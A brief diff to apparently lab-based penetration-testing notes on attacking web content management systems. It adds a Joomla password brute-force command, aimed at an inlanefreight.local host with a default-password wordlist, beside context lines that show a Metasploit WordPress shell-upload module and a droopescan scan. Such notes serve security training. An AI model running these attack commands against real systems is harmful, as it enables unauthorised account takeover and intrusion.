@@ -45,4 +45,10 @@ msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.l
 droopescan scan joomla --url http://dev.inlanefreight.local/
 ```
 
+### Brute Force
+
+[joomla-brute.py](https://github.com/ajnik/joomla-bruteforce)
+```
+python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+```
 
